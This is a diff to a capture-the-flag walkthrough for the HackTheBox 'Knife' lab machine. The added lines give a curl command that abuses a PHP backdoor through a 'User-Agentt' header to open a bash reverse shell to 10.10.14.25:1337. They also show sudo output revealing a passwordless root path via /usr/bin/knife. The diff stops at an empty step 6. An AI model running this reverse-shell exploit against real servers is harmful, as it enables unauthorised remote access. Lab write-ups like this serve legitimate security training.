@@ -98,6 +98,17 @@ else:
     exit
 ```
 
+#### NOTES:
+
+```
+Another simple way, you can use this:
+
+curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
+&>/dev/tcp/10.10.14.25:1337 0>&1 '\");"
+
+Then set a listener on port 1337
+```
+
 > RESULT
 
 ```
@@ -152,4 +163,17 @@ $
 b18383f88c92034b8db5157c1c8c28fb
 ```
 
-5. To get the root flag, let's run `sudo -l` to see if there is any actions we can do with
+5. To get the root flag, let's run `sudo -l` to see the sudo permissions for james.
+
+```
+$ sudo -l 
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+$ 
+```
+
+6. 
